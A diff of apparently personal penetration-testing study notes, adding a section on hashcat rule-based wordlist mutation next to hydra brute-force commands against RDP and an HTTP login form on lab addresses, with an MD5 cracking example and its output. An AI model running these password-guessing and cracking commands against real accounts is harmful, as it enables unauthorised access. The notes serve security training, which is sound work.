@@ -703,8 +703,35 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
   - HTTP POST login  
    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form
-- password cracking
-  - dd 
+- mutating wordlist
+  - ``
+  - `echo -n "secret" | sha256sum`: hash secret
+  - `sed -i '/^1/d' demo.txt` remove all passwords start with '1'
+  - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) mutate password
+  - `echo \$1 > demo.rule`: append 1 to password (new rule)
+  - `hashcat -r demo.rule --stdout demo.txt --backend-ignore-opencl`: hashcat debug to display all mutated passwords
+  - ```
+    cat demo1.rule > hashcat -r demo1.rule --stdout demo.txt
+
+    $1 c
+    Password1
+    Iloveyou1
+    
+    $1
+    c
+    password1
+    Password
+
+    $1 c $!
+    Password1!
+
+    $! $1 c
+    Password!1
+    ```
+  - capitalization of the first letter + "!" special chr + numerical values
+    `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  -m hash type, 0 is MD5
+    Output cracked status: f621b6c9eab51a3e2f4e167fee4c6860:Computer123! 
+  - hashcat rules `ls -la /usr/share/hashcat/rules/`
 - password hashes  
   - NTLM  
   - NTLMv2  
